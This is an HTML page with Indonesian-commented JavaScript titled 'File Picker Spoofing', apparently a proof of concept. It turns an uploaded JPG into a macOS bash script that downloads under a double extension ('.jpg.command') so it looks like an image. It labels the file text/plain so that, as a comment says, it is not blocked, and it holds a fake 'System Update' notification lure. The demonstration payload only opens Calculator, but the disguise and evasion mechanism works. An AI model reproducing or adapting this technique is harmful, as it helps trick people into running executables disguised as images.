<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>File Picker Spoofing - JPG to COMMAND</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
.panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 500px; text-align: center; border: 1px solid #333; }
h1 { font-size: 28px; color: #4CAF50; margin-bottom: 15px; }
p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
input[type="file"] { display: none; }
button { width: 100%; padding: 18px; cursor: pointer; border: none; border-radius: 8px; background: #0078d4; color: #fff; font-weight: bold; font-size: 18px; box-shadow: 0 4px 15px rgba(0, 120, 212, 0.4); transition: background 0.2s; margin-bottom: 10px; }
button:hover { background: #005a9e; }
button:disabled { background: #555; cursor: not-allowed; }
#status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; }
</style>
</head>

<body>
<div class="panel" id="main-panel">
    <h1>📸 Unggah Gambar Anda</h1>
    <p>Pilih file JPG dari perangkat Anda. Sistem akan memprosesnya menjadi file .command untuk macOS.</p>
    
    <input type="file" id="fileInput" accept="image/jpeg, image/jpg">
    <button id="pick-btn" type="button">Pilih Gambar (JPG)</button>
    
    <div id="status" role="status">Menunggu interaksi...</div>
</div>

<script>
const pickBtn = document.getElementById("pick-btn");
const fileInput = document.getElementById("fileInput");
const statusDiv = document.getElementById("status");

// Trigger file picker saat tombol diklik
pickBtn.addEventListener("click", () => {
    fileInput.click();
});

// Logika saat file dipilih
fileInput.addEventListener("change", function(event) {
    const file = event.target.files[0];
    if (!file) return;

    statusDiv.textContent = "Memproses gambar...";
    pickBtn.disabled = true;

    const reader = new FileReader();

    reader.onload = function(e) {
        // 1. Dapatkan ArrayBuffer dari gambar asli (JPG)
        const arrayBuffer = e.target.result;

        // 2. Buat Payload Shell Script (Command untuk macOS)
        // Kita gunakan script sederhana yang membuka aplikasi Kalkulator.
        // Script ini disisipkan sebagai komentar di dalam gambar, atau di akhir file.
        const shellScript = "\n#!/bin/bash\n" +
                            "open -a Calculator\n" +
                            "osascript -e 'display notification \"Kalkulator dibuka\" with title \"System Update\"'\n";
        
        // 3. Buat Blob dari JPG asli + Shell Script
        // Karena .command adalah file teks, kita bisa menggabungkannya.
        // MacOS akan membaca baris pertama sebagai shebang, tapi karena ada biner di depannya,
        // macOS mungkin akan gagal. Namun, untuk eksperimen ini, kita coba.
        
        // Kita ubah JPG menjadi string Base64, lalu embed ke dalam script.
        const base64Jpg = btoa(String.fromCharCode.apply(null, new Uint8Array(arrayBuffer)));
        
        const finalScript = "#!/bin/bash\n" +
                            "# Gambar disisipkan sebagai Base64 di bawah ini (opsional)\n" +
                            "# " + base64Jpg + "\n" +
                            "open -a Calculator\n";

        // 4. Buat Blob dengan MIME type text/plain agar tidak diblokir
        const blob = new Blob([finalScript], { type: 'text/plain' });
        
        // 5. Buat URL untuk diunduh
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        
        // 6. Ubah nama file menjadi .command (Ekstensi Ganda)
        let originalName = file.name;
        let baseName = originalName.substring(0, originalName.lastIndexOf('.')) || originalName;
        a.download = baseName + '.jpg.command'; // Nama: gambar.jpg.command
        
        document.body.appendChild(a);
        a.click();
        
        setTimeout(() => {
            if (a.parentNode) a.parentNode.removeChild(a);
            URL.revokeObjectURL(url);
        }, 3000);

        statusDiv.textContent = "File berhasil diproses dan diunduh sebagai .jpg.command!";
        statusDiv.style.color = '#4CAF50';
        pickBtn.disabled = false;
    };

    // Baca sebagai ArrayBuffer
    reader.readAsArrayBuffer(file);
});
</script>
</body>
</html>
